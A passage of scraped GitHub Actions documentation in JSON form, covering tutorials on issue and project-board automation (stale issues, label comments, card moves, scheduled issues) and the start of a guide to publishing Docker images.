          "Customize the parameters in your workflow file:Change the value foron.scheduleto dictate when you want this workflow to run. In the example above, the workflow will run every day at 1:30 UTC. For more information about scheduled workflows, seeEvents that trigger workflows.Change the value fordays-before-issue-staleto the number of days without activity before theactions/staleaction labels an issue. If you never want this action to label issues, set this value to-1.Change the value fordays-before-issue-closeto the number of days without activity before theactions/staleaction closes an issue. If you never want this action to close issues, set this value to-1.Change the value forstale-issue-labelto the label that you want to apply to issues that have been inactive for the amount of time specified bydays-before-issue-stale.Change the value forstale-issue-messageto the comment that you want to add to issues that are labeled by theactions/staleaction.Change the value forclose-issue-messageto the comment that you want to add to issues that are closed by theactions/staleaction.",
          "Change the value foron.scheduleto dictate when you want this workflow to run. In the example above, the workflow will run every day at 1:30 UTC. For more information about scheduled workflows, seeEvents that trigger workflows.",
          "Change the value fordays-before-issue-staleto the number of days without activity before theactions/staleaction labels an issue. If you never want this action to label issues, set this value to-1.",
          "Change the value fordays-before-issue-closeto the number of days without activity before theactions/staleaction closes an issue. If you never want this action to close issues, set this value to-1.",
          "Change the value forstale-issue-labelto the label that you want to apply to issues that have been inactive for the amount of time specified bydays-before-issue-stale.",
          "Change the value forstale-issue-messageto the comment that you want to add to issues that are labeled by theactions/staleaction.",
          "Change the value forclose-issue-messageto the comment that you want to add to issues that are closed by theactions/staleaction.",
          "Commit your workflow file to the default branch of your repository. For more information, seeCreating new files."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Expected results"
      },
      {
        "type": "paragraph",
        "text": "Based on thescheduleparameter (for example, every day at 1:30 UTC), your workflow will find issues that have been inactive for the specified period of time and will add the specified comment and label. Additionally, your workflow will close any previously labeled issues if no additional activity has occurred for the specified period of time."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Thescheduleevent can be delayed during periods of high loads of GitHub Actions workflow runs. High load times include the start of every hour. If the load is sufficiently high enough, some queued jobs may be dropped. To decrease the chance of delay, schedule your workflow to run at a different time of the hour."
      },
      {
        "type": "paragraph",
        "text": "You can view the history of your workflow runs to see this workflow run periodically. For more information, seeViewing workflow run history."
      },
      {
        "type": "paragraph",
        "text": "This workflow will only label and/or close 30 issues at a time in order to avoid exceeding a rate limit. You can configure this with theoperations-per-runsetting. For more information, see theactions/staleaction documentation."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Next steps"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To learn more about additional things you can do with theactions/staleaction, like closing inactive pull requests, ignoring issues with certain labels or milestones, or only checking issues with certain labels, see theactions/staleaction documentation.",
          "Search GitHubfor examples of workflows using this action."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/project-management/commenting-on-an-issue-when-a-label-is-added",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This tutorial demonstrates how to use the GitHub CLI to comment on an issue when a specific label is applied. For example, when thehelp wantedlabel is added to an issue, you can add a comment to encourage contributors to work on the issue. For more information about GitHub CLI, seeUsing GitHub CLI in workflows."
      },
      {
        "type": "paragraph",
        "text": "In the tutorial, you will first make a workflow file that uses thegh issue commentcommand to comment on an issue. Then, you will customize the workflow to suit your needs."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating the workflow"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Choose a repository where you want to apply this project management workflow. You can use an existing repository that you have write access to, or you can create a new repository. For more information about creating a repository, seeCreating a new repository.",
          "In your repository, create a file called.github/workflows/YOUR_WORKFLOW.yml, replacingYOUR_WORKFLOWwith a name of your choice. This is a workflow file. For more information about creating new files on GitHub, seeCreating new files.",
          "Copy the following YAML contents into your workflow file.YAMLname: Add comment\non:\n  issues:\n    types:\n      - labeled\njobs:\n  add-comment:\n    if: github.event.label.name == 'help wanted'\n    runs-on: ubuntu-latest\n    permissions:\n      issues: write\n    steps:\n      - name: Add comment\n        run: gh issue comment \"$NUMBER\" --body \"$BODY\"\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          GH_REPO: ${{ github.repository }}\n          NUMBER: ${{ github.event.issue.number }}\n          BODY: >\n            This issue is available for anyone to work on.\n            **Make sure to reference this issue in your pull request.**\n            :sparkles: Thank you for your contribution! :sparkles:name:Addcommenton:issues:types:-labeledjobs:add-comment:if:github.event.label.name=='help wanted'runs-on:ubuntu-latestpermissions:issues:writesteps:-name:Addcommentrun:ghissuecomment\"$NUMBER\"--body\"$BODY\"env:GH_TOKEN:${{secrets.GITHUB_TOKEN}}GH_REPO:${{github.repository}}NUMBER:${{github.event.issue.number}}BODY:>\n            This issue is available for anyone to work on.\n            **Make sure to reference this issue in your pull request.**\n            :sparkles: Thank you for your contribution! :sparkles:",
          "Customize the parameters in your workflow file:Replacehelp wantedinif: github.event.label.name == 'help wanted'with the label that you want to act on. If you want to act on more than one label, separate the conditions with||. For example,if: github.event.label.name == 'bug' || github.event.label.name == 'fix me'will comment whenever thebugorfix melabels are added to an issue.Change the value forBODYto the comment that you want to add. GitHub flavored markdown is supported. For more information about markdown, seeBasic writing and formatting syntax.",
          "Replacehelp wantedinif: github.event.label.name == 'help wanted'with the label that you want to act on. If you want to act on more than one label, separate the conditions with||. For example,if: github.event.label.name == 'bug' || github.event.label.name == 'fix me'will comment whenever thebugorfix melabels are added to an issue.",
          "Change the value forBODYto the comment that you want to add. GitHub flavored markdown is supported. For more information about markdown, seeBasic writing and formatting syntax.",
          "Commit your workflow file to the default branch of your repository. For more information, seeCreating new files."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Testing the workflow"
      },
      {
        "type": "paragraph",
        "text": "Every time an issue in your repository is labeled, this workflow will run. If the label that was added is one of the labels that you specified in your workflow file, thegh issue commentcommand will add the comment that you specified to the issue."
      },
      {
        "type": "paragraph",
        "text": "Test your workflow by applying your specified label to an issue."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Open an issue in your repository. For more information, seeCreating an issue.",
          "Label the issue with the specified label in your workflow file. For more information, seeManaging labels.",
          "To see the workflow run triggered by labeling the issue, view the history of your workflow runs. For more information, seeViewing workflow run history.",
          "When the workflow completes, the issue that you labeled should have a comment added."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Next steps"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To learn more about additional things you can do with the GitHub CLI, like editing existing comments, visit theGitHub CLI Manual."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/project-management/moving-assigned-issues-on-project-boards",
    "content": [
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Projects, the all-new projects experience, is now available. For more information about Projects, seeAbout Projects.",
          "You can only create a new project (classic) for an organization, repository,  or user that already has at least one project (classic).  If you're unable to create a project (classic), create a project instead."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners are not currently supported on GitHub Enterprise Server. You can see more information about planned future support on theGitHub public roadmap."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This tutorial demonstrates how to use thealex-page/github-project-automation-plusactionto automatically move an issue to a specific column on a project (classic) when the issue is assigned. For example, when an issue is assigned, you can move it into theIn Progresscolumn your project (classic)."
      },
      {
        "type": "paragraph",
        "text": "In the tutorial, you will first make a workflow file that uses thealex-page/github-project-automation-plusaction. Then, you will customize the workflow to suit your needs."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating the workflow"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Choose a repository where you want to apply this project management workflow. You can use an existing repository that you have write access to, or you can create a new repository. For more information about creating a repository, seeCreating a new repository.",
          "In your repository, choose a project (classic).  You can use an existing project, or you can create a new project. For more information about creating a project, seeCreating a project (classic).",
          "In your repository, create a file called.github/workflows/YOUR_WORKFLOW.yml, replacingYOUR_WORKFLOWwith a name of your choice. This is a workflow file. For more information about creating new files on GitHub, seeCreating new files.",
          "Copy the following YAML contents into your workflow file.YAML# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Move assigned card\non:\n  issues:\n    types:\n      - assigned\njobs:\n  move-assigned-card:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: alex-page/github-project-automation-plus@7ffb872c64bd809d23563a130a0a97d01dfa8f43\n        with:\n          project: Docs Work\n          column: In Progress\n          repo-token: ${{ secrets.PERSONAL_ACCESS_TOKEN }}# This workflow uses actions that are not certified by GitHub.# They are provided by a third-party and are governed by# separate terms of service, privacy policy, and support# documentation.# GitHub recommends pinning actions to a commit SHA.# To get a newer version, you will need to update the SHA.# You can also reference a tag or branch, but the action may change without warning.name:Moveassignedcardon:issues:types:-assignedjobs:move-assigned-card:runs-on:ubuntu-lateststeps:-uses:alex-page/github-project-automation-plus@7ffb872c64bd809d23563a130a0a97d01dfa8f43with:project:DocsWorkcolumn:InProgressrepo-token:${{secrets.PERSONAL_ACCESS_TOKEN}}",
          "Customize the parameters in your workflow file:Change the value forprojectto the name of your project (classic). If you have multiple projects (classic) with the same name, thealex-page/github-project-automation-plusaction will act on all projects with the specified name.Change the value forcolumnto the name of the column where you want issues to move when they are assigned.Change the value forrepo-token:Create a personal access token (classic) with thereposcope. For more information, seeManaging your personal access tokens.Store this personal access token as a secret in your repository. For more information about storing secrets, seeUsing secrets in GitHub Actions.In your workflow file, replacePERSONAL_ACCESS_TOKENwith the name of your secret.",
          "Change the value forprojectto the name of your project (classic). If you have multiple projects (classic) with the same name, thealex-page/github-project-automation-plusaction will act on all projects with the specified name.",
          "Change the value forcolumnto the name of the column where you want issues to move when they are assigned.",
          "Change the value forrepo-token:Create a personal access token (classic) with thereposcope. For more information, seeManaging your personal access tokens.Store this personal access token as a secret in your repository. For more information about storing secrets, seeUsing secrets in GitHub Actions.In your workflow file, replacePERSONAL_ACCESS_TOKENwith the name of your secret.",
          "Create a personal access token (classic) with thereposcope. For more information, seeManaging your personal access tokens.",
          "Store this personal access token as a secret in your repository. For more information about storing secrets, seeUsing secrets in GitHub Actions.",
          "In your workflow file, replacePERSONAL_ACCESS_TOKENwith the name of your secret.",
          "Commit your workflow file to the default branch of your repository. For more information, seeCreating new files."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Testing the workflow"
      },
      {
        "type": "paragraph",
        "text": "Whenever an issue in your repository is assigned, the issue will be moved to the specified project (classic) column. If the issue is not already on the project (classic), it will be added to the project (classic)."
      },
      {
        "type": "paragraph",
        "text": "If your repository is user-owned, thealex-page/github-project-automation-plusaction will act on all projects in your repository or personal account that have the specified project name and column. Likewise, if your repository is organization-owned, the action will act on all projects in your repository or organization that have the specified project name and column."
      },
      {
        "type": "paragraph",
        "text": "Test your workflow by assigning an issue in your repository."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Open an issue in your repository. For more information, seeCreating an issue.",
          "Assign the issue. For more information, seeAssigning issues and pull requests to other GitHub users.",
          "To see the workflow run that assigning the issue triggered, view the history of your workflow runs. For more information, seeViewing workflow run history.",
          "When the workflow completes, the issue that you assigned should be added to the specified project (classic) column."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Next steps"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To learn more about additional things you can do with thealex-page/github-project-automation-plusaction, like deleting or archiving project cards, visit thealex-page/github-project-automation-plusaction documentation."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/project-management/removing-a-label-when-a-card-is-added-to-a-project-board-column",
    "content": [
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Projects, the all-new projects experience, is now available. For more information about Projects, seeAbout Projects.",
          "You can only create a new project (classic) for an organization, repository,  or user that already has at least one project (classic).  If you're unable to create a project (classic), create a project instead."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners are not currently supported on GitHub Enterprise Server. You can see more information about planned future support on theGitHub public roadmap."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This tutorial demonstrates how to use theactions/github-scriptactionalong with a conditional to remove a label from issues and pull requests that are added to a specific column on a project (classic). For example, you can remove theneeds reviewlabel when project cards are moved into theDonecolumn."
      },
      {
        "type": "paragraph",
        "text": "In the tutorial, you will first make a workflow file that uses theactions/github-scriptaction. Then, you will customize the workflow to suit your needs."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating the workflow"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Choose a repository where you want to apply this project management workflow. You can use an existing repository that you have write access to, or you can create a new repository. For more information about creating a repository, seeCreating a new repository.",
          "Choose a project (classic) that belongs to the repository. This workflow cannot be used with projects that belong to users or organizations.  You can use an existing project (classic), or you can create a new project (classic). For more information about creating a project, seeCreating a project (classic).",
          "In your repository, create a file called.github/workflows/YOUR_WORKFLOW.yml, replacingYOUR_WORKFLOWwith a name of your choice. This is a workflow file. For more information about creating new files on GitHub, seeCreating new files.",
          "Copy the following YAML contents into your workflow file.YAMLname: Remove a label\non:\n  project_card:\n    types:\n      - moved\njobs:\n  remove_label:\n    if: github.event.project_card.column_id == '12345678'\n    runs-on: ubuntu-latest\n    permissions:\n      issues: write\n      pull-requests: write\n    steps:\n      - uses: actions/github-script@v7\n        with:\n          script: |\n            // this gets the number at the end of the content URL, which should be the issue/PR number\n            const issue_num = context.payload.project_card.content_url.split('/').pop()\n            github.rest.issues.removeLabel({\n              issue_number: issue_num,\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              name: [\"needs review\"]\n            })name:Removealabelon:project_card:types:-movedjobs:remove_label:if:github.event.project_card.column_id=='12345678'runs-on:ubuntu-latestpermissions:issues:writepull-requests:writesteps:-uses:actions/github-script@v7with:script:|\n            // this gets the number at the end of the content URL, which should be the issue/PR number\n            const issue_num = context.payload.project_card.content_url.split('/').pop()\n            github.rest.issues.removeLabel({\n              issue_number: issue_num,\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              name: [\"needs review\"]\n            })",
          "Customize the parameters in your workflow file:Ingithub.event.project_card.column_id == '12345678', replace12345678with the ID of the column where you want to un-label issues and pull requests that are moved there.To find the column ID, navigate to your project (classic). Next to the title of the column, clickthen clickCopy column link. The column ID is the number at the end of the copied link. For example,24687531is the column ID forhttps://github.com/octocat/octo-repo/projects/1#column-24687531.If you want to act on more than one column, separate the conditions with||. For example,if github.event.project_card.column_id == '12345678' || github.event.project_card.column_id == '87654321'will act whenever a project card is added to column12345678or column87654321. The columns may be on different projects (classic).Change the value fornamein thegithub.rest.issues.removeLabel()function to the name of the label that you want to remove from issues or pull requests that are moved to the specified column(s). For more information on labels, seeManaging labels.",
          "Ingithub.event.project_card.column_id == '12345678', replace12345678with the ID of the column where you want to un-label issues and pull requests that are moved there.To find the column ID, navigate to your project (classic). Next to the title of the column, clickthen clickCopy column link. The column ID is the number at the end of the copied link. For example,24687531is the column ID forhttps://github.com/octocat/octo-repo/projects/1#column-24687531.If you want to act on more than one column, separate the conditions with||. For example,if github.event.project_card.column_id == '12345678' || github.event.project_card.column_id == '87654321'will act whenever a project card is added to column12345678or column87654321. The columns may be on different projects (classic).",
          "Change the value fornamein thegithub.rest.issues.removeLabel()function to the name of the label that you want to remove from issues or pull requests that are moved to the specified column(s). For more information on labels, seeManaging labels.",
          "Commit your workflow file to the default branch of your repository. For more information, seeCreating new files."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Testing the workflow"
      },
      {
        "type": "paragraph",
        "text": "Every time a project card on a project (classic) in your repository moves, this workflow will run. If the card is an issue or a pull request and is moved into the column that you specified, then the workflow will remove the specified label from the issue or a pull request. Cards that are notes will not be affected."
      },
      {
        "type": "paragraph",
        "text": "Test your workflow out by moving an issue on your project (classic) into the target column."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Open an issue in your repository. For more information, seeCreating an issue.",
          "Label the issue with the label that you want the workflow to remove. For more information, seeManaging labels.",
          "Add the issue to the project (classic) column that you specified in your workflow file. For more information, seeAdding issues and pull requests to a project (classic).",
          "To see the workflow run that was triggered by adding the issue to the project, view the history of your workflow runs. For more information, seeViewing workflow run history.",
          "When the workflow completes, the issue that you added to the project column should have the specified label removed."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Next steps"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To learn more about additional things you can do with theactions/github-scriptaction, see theactions/github-scriptaction documentation.",
          "Search GitHubfor examples of workflows using this action."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/project-management/scheduling-issue-creation",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This tutorial demonstrates how to use the GitHub CLI to create an issue on a regular basis. For example, you can create an issue each week to use as the agenda for a team meeting. For more information about GitHub CLI, seeUsing GitHub CLI in workflows."
      },
      {
        "type": "paragraph",
        "text": "In the tutorial, you will first make a workflow file that uses the GitHub CLI. Then, you will customize the workflow to suit your needs."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating the workflow"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Choose a repository where you want to apply this project management workflow. You can use an existing repository that you have write access to, or you can create a new repository. For more information about creating a repository, seeCreating a new repository.",
          "In your repository, create a file called.github/workflows/YOUR_WORKFLOW.yml, replacingYOUR_WORKFLOWwith a name of your choice. This is a workflow file. For more information about creating new files on GitHub, seeCreating new files.",
          "Copy the following YAML contents into your workflow file.YAMLname: Weekly Team Sync\non:\n  schedule:\n    - cron: 20 07 * * 1\n\njobs:\n  create_issue:\n    name: Create team sync issue\n    runs-on: ubuntu-latest\n    permissions:\n      issues: write\n    steps:\n      - name: Create team sync issue\n        run: |\n          if [[ $CLOSE_PREVIOUS == true ]]; then\n            previous_issue_number=$(gh issue list \\\n              --label \"$LABELS\" \\\n              --json number \\\n              --jq '.[0].number')\n            if [[ -n $previous_issue_number ]]; then\n              gh issue close \"$previous_issue_number\"\n              gh issue unpin \"$previous_issue_number\"\n            fi\n          fi\n          new_issue_url=$(gh issue create \\\n            --title \"$TITLE\" \\\n            --assignee \"$ASSIGNEES\" \\\n            --label \"$LABELS\" \\\n            --body \"$BODY\")\n          if [[ $PINNED == true ]]; then\n            gh issue pin \"$new_issue_url\"\n          fi\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          GH_REPO: ${{ github.repository }}\n          TITLE: Team sync\n          ASSIGNEES: monalisa,doctocat,hubot\n          LABELS: weekly sync,docs-team\n          BODY: |\n            ### Agenda\n\n            - [ ] Start the recording\n            - [ ] Check-ins\n            - [ ] Discussion points\n            - [ ] Post the recording\n\n            ### Discussion Points\n            Add things to discuss below\n\n            - [Work this week](https://github.com/orgs/github/projects/3)\n          PINNED: false\n          CLOSE_PREVIOUS: falsename:WeeklyTeamSyncon:schedule:-cron:2007**1jobs:create_issue:name:Createteamsyncissueruns-on:ubuntu-latestpermissions:issues:writesteps:-name:Createteamsyncissuerun:|\n          if [[ $CLOSE_PREVIOUS == true ]]; then\n            previous_issue_number=$(gh issue list \\\n              --label \"$LABELS\" \\\n              --json number \\\n              --jq '.[0].number')\n            if [[ -n $previous_issue_number ]]; then\n              gh issue close \"$previous_issue_number\"\n              gh issue unpin \"$previous_issue_number\"\n            fi\n          fi\n          new_issue_url=$(gh issue create \\\n            --title \"$TITLE\" \\\n            --assignee \"$ASSIGNEES\" \\\n            --label \"$LABELS\" \\\n            --body \"$BODY\")\n          if [[ $PINNED == true ]]; then\n            gh issue pin \"$new_issue_url\"\n          fienv:GH_TOKEN:${{secrets.GITHUB_TOKEN}}GH_REPO:${{github.repository}}TITLE:TeamsyncASSIGNEES:monalisa,doctocat,hubotLABELS:weeklysync,docs-teamBODY:|\n            ### Agenda-[ ]Starttherecording-[ ]Check-ins-[ ]Discussionpoints-[ ]Posttherecording### Discussion PointsAddthingstodiscussbelow-[Workthisweek](https://github.com/orgs/github/projects/3)PINNED:falseCLOSE_PREVIOUS:false",
          "Customize the parameters in your workflow file:Change the value foron.scheduleto dictate when you want this workflow to run. In the example above, the workflow will run every Monday at 7:20 UTC. For more information about scheduled workflows, seeEvents that trigger workflows.Change the value forASSIGNEESto the list of GitHub usernames that you want to assign to the issue.Change the value forLABELSto the list of labels that you want to apply to the issue.Change the value forTITLEto the title that you want the issue to have.Change the value forBODYto the text that you want in the issue body. The|character allows you to use a multi-line value for this parameter.If you want to pin this issue in your repository, setPINNEDtotrue. For more information about pinned issues, seePinning an issue to your repository.If you want to close the previous issue generated by this workflow each time a new issue is created, setCLOSE_PREVIOUStotrue. The workflow will close the most recent issue that has the labels defined in thelabelsfield. To avoid closing the wrong issue, use a unique label or combination of labels.",
          "Change the value foron.scheduleto dictate when you want this workflow to run. In the example above, the workflow will run every Monday at 7:20 UTC. For more information about scheduled workflows, seeEvents that trigger workflows.",
          "Change the value forASSIGNEESto the list of GitHub usernames that you want to assign to the issue.",
          "Change the value forLABELSto the list of labels that you want to apply to the issue.",
          "Change the value forTITLEto the title that you want the issue to have.",
          "Change the value forBODYto the text that you want in the issue body. The|character allows you to use a multi-line value for this parameter.",
          "If you want to pin this issue in your repository, setPINNEDtotrue. For more information about pinned issues, seePinning an issue to your repository.",
          "If you want to close the previous issue generated by this workflow each time a new issue is created, setCLOSE_PREVIOUStotrue. The workflow will close the most recent issue that has the labels defined in thelabelsfield. To avoid closing the wrong issue, use a unique label or combination of labels.",
          "Commit your workflow file to the default branch of your repository. For more information, seeCreating new files."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Expected results"
      },
      {
        "type": "paragraph",
        "text": "Based on thescheduleparameter (for example, every Monday at 7:20 UTC), your workflow will create a new issue with the assignees, labels, title, and body that you specified. If you setPINNEDtotrue, the workflow will pin the issue to your repository. If you setCLOSE_PREVIOUSto true, the workflow will close the most recent issue with matching labels."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Thescheduleevent can be delayed during periods of high loads of GitHub Actions workflow runs. High load times include the start of every hour. If the load is sufficiently high enough, some queued jobs may be dropped. To decrease the chance of delay, schedule your workflow to run at a different time of the hour."
      },
      {
        "type": "paragraph",
        "text": "You can view the history of your workflow runs to see this workflow run periodically. For more information, seeViewing workflow run history."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Next steps"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To learn more about additional things you can do with the GitHub CLI, like using an issue template, see thegh issue createdocumentation.",
          "Search GitHub Marketplacefor actions related to scheduled issues."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/project-management/using-github-actions-for-project-management",
    "content": [
      {
        "type": "paragraph",
        "text": "You can use GitHub Actions to automate your project management tasks by creating workflows. Each workflow contains a series of tasks that are performed automatically every time the workflow runs. For example, you can create a workflow that runs every time an issue is created to add a label and leave a comment."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "When do workflows run?"
      },
      {
        "type": "paragraph",
        "text": "You can configure your workflows to run on a schedule or be triggered when an event occurs. For example, you can set your workflow to run when someone creates an issue in a repository."
      },
      {
        "type": "paragraph",
        "text": "Many workflow triggers are useful for automating project management."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "An issue is opened, assigned, or labeled.",
          "A comment is added to an issue.",
          "A scheduled time."
        ]
      },
      {
        "type": "paragraph",
        "text": "For a full list of events that can trigger workflows, seeEvents that trigger workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "What can workflows do?"
      },
      {
        "type": "paragraph",
        "text": "Workflows can do many things, such as commenting on an issue, adding or removing labels, and opening issues."
      },
      {
        "type": "paragraph",
        "text": "You can learn about using GitHub Actions for project management by following these tutorials, which include example workflows that you can adapt to meet your needs."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Adding labels to issues",
          "Commenting on an issue when a label is added",
          "Closing inactive issues",
          "Scheduling issue creation"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/publishing-packages/about-packaging-with-github-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Packaging in continuous integration workflows"
      },
      {
        "type": "paragraph",
        "text": "A packaging step is a common part of a continuous integration or continuous delivery workflow. Creating a package at the end of a continuous integration workflow can help during code reviews on a pull request."
      },
      {
        "type": "paragraph",
        "text": "After building and testing your code, a packaging step can produce a runnable or deployable artifact. Depending on the kind of application you're building, this package can be downloaded locally for manual testing, made available for users to download, or deployed to a staging or production environment."
      },
      {
        "type": "paragraph",
        "text": "For example, a continuous integration workflow for a Java project may runmvn packageto produce a JAR file. Or, a CI workflow for a Node.js application may create a Docker container."
      },
      {
        "type": "paragraph",
        "text": "Now, when reviewing a pull request, you'll be able to look at the workflow run and download the artifact that was produced."
      },
      {
        "type": "paragraph",
        "text": "This will let you run the code in the pull request on your machine, which can help with debugging or testing the pull request."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Workflows for publishing packages"
      },
      {
        "type": "paragraph",
        "text": "In addition to uploading packaging artifacts for testing in a continuous integration workflow, you can create workflows that build your project and publish packages to a package registry."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Publish packages to GitHub PackagesGitHub Packages can act as a package hosting service for many types of packages. You can choose to share your packages with all of GitHub, or private packages to share with collaborators or an organization. For more information, seeIntroduction to GitHub Packages.You may want to publish packages to GitHub Packages on every push into the default branch. This will allow developers on your project to always be able to run and test the latest build from the default branch easily, by installing it from GitHub Packages.",
          "Publish packages to a package registry:For many projects, publishing to a package registry is performed whenever a new version of a project is released. For example, a project that produces a JAR file may upload new releases to the Maven Central repository. Or, a .NET project may produce a nuget package and upload it to the NuGet Gallery.You can automate this by creating a workflow that publishes packages to a package registry on every release creation. For more information, seeManaging releases in a repository."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Publishing Node.js packages"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/publishing-packages/publishing-docker-images",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you how to create a workflow that performs a Docker build, and then publishes Docker images to Docker Hub or GitHub Packages. With a single workflow, you can publish images to a single registry or to multiple registries."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If you want to push to another third-party Docker registry, the example in thePublishing images to GitHub Packagessection can serve as a good template."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "We recommend that you have a basic understanding of workflow configuration options and how to create a workflow file. For more information, seeWriting workflows."
      },
      {
        "type": "paragraph",
        "text": "You might also find it helpful to have a basic understanding of the following:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Using secrets in GitHub Actions",
          "Automatic token authentication",
          "Working with the Container registry"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About image configuration"
      },
      {
        "type": "paragraph",
        "text": "This guide assumes that you have a complete definition for a Docker image stored in a GitHub repository. For example, your repository must contain aDockerfile, and any other files needed to perform a Docker build to create an image."
      },
      {
        "type": "paragraph",
        "text": "You can use pre-defined annotation keys to add metadata including a description, a license, and a source repository to your container image. For more information, seeWorking with the Container registry."
      },
      {
        "type": "paragraph",
        "text": "In this guide, we will use the Dockerbuild-push-actionaction to build the Docker image and push it to one or more Docker registries. For more information, seebuild-push-action."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing images to Docker Hub"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Docker Hub normally imposes rate limits on both push and pull operations which will affect jobs on self-hosted runners. However, GitHub-hosted runners are not subject to these limits based on an agreement between GitHub and Docker."
      },
      {
        "type": "paragraph",
        "text": "Each time you create a new release on GitHub, you can trigger a workflow to publish your image. The workflow in the example below runs when thereleaseevent triggers with thepublishedactivity type."
      },
      {
        "type": "paragraph",
        "text": "In the example workflow below, we use the Dockerlogin-actionandbuild-push-actionactions to build the Docker image and, if the build succeeds, push the built image to Docker Hub."
      },
      {
        "type": "paragraph",
        "text": "To push to Docker Hub, you will need to have a Docker Hub account, and have a Docker Hub repository created. For more information, seePushing a Docker container image to Docker Hubin the Docker documentation."
      },
      {
        "type": "paragraph",
        "text": "Thelogin-actionoptions required for Docker Hub are:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "usernameandpassword: This is your Docker Hub username and password. We recommend storing your Docker Hub username and password as secrets so they aren't exposed in your workflow file. For more information, seeUsing secrets in GitHub Actions."
        ]
      },
      {
        "type": "paragraph",
        "text": "Themetadata-actionoption required for Docker Hub is:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "images: The namespace and name for the Docker image you are building/pushing to Docker Hub."
        ]
      },
      {
        "type": "paragraph",
        "text": "Thebuild-push-actionoptions required for Docker Hub are:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "tags: The tag of your new image in the formatDOCKER-HUB-NAMESPACE/DOCKER-HUB-REPOSITORY:VERSION. You can set a single tag as shown below, or specify multiple tags in a list.",
          "push: If set totrue, the image will be pushed to the registry if it is built successfully."
        ]
      },
      {
